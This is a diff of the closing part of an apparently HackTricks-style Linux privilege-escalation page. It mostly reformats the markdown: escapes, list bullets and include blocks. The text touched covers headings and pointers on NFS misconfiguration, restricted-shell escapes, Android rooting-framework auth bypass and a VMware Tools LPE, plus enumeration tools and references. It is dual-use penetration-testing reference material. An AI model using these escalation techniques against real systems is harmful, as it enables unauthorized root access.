-**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
+**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
 If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.
 
@@ -1709,33 +1665,21 @@ On the other hand, `/etc/init` is associated with **Upstart**, a newer **service
 
 ### NFS Privilege escalation
 
-
-{{#ref}}
-nfs-no_root_squash-misconfiguration-pe.md
-{{#endref}}
+\{{#ref\}} nfs-no\_root\_squash-misconfiguration-pe.md \{{#endref\}}
 
 ### Escaping from restricted Shells
 
-
-{{#ref}}
-escaping-from-limited-bash.md
-{{#endref}}
+\{{#ref\}} escaping-from-limited-bash.md \{{#endref\}}
 
 ### Cisco - vmanage
 
-
-{{#ref}}
-cisco-vmanage.md
-{{#endref}}
+\{{#ref\}} cisco-vmanage.md \{{#endref\}}
 
 ## Android rooting frameworks: manager-channel abuse
 
 Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:
 
-
-{{#ref}}
-android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
-{{#endref}}
+\{{#ref\}} android-rooting-frameworks-manager-auth-bypass-syscall-hook.md \{{#endref\}}
 
 ## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)
 
@@ -1743,14 +1687,12 @@ Regex-driven service discovery in VMware Tools/Aria Operations can extract a bin
 
 Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:
 
-{{#ref}}
-vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
-{{#endref}}
+\{{#ref\}} vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md \{{#endref\}}
 
 ## Kernel Security Protections
 
-- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
-- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)
+* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
+* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)
 
 ## More help
 
@@ -1766,39 +1708,35 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 **Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
 **Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
-**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
+**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
 **EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
 **Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
 
 ## References
 
-- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
-- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
+* [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
+* [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
+* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
+* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
+* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
+* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
+* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
+* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
+* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
+* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
+* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
+* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
+* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
+* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
+* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
+* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
+* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
+* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
+* [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
+* [GNU Bash Manual – BASH\_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
+* [0xdf – HTB Environment (sudo env\_keep BASH\_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
+* [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
 
-
-- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
-- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
-- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
-- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
-- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
-- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
-- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
-- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
-- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
-- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
-- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
-- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
-- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
-- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
-- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
-- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
-- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
-- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
-- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
-
-- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
-
-{{#include ../../banners/hacktricks-training.md}}
-
+\{{#include ../../banners/hacktricks-training.md\}}
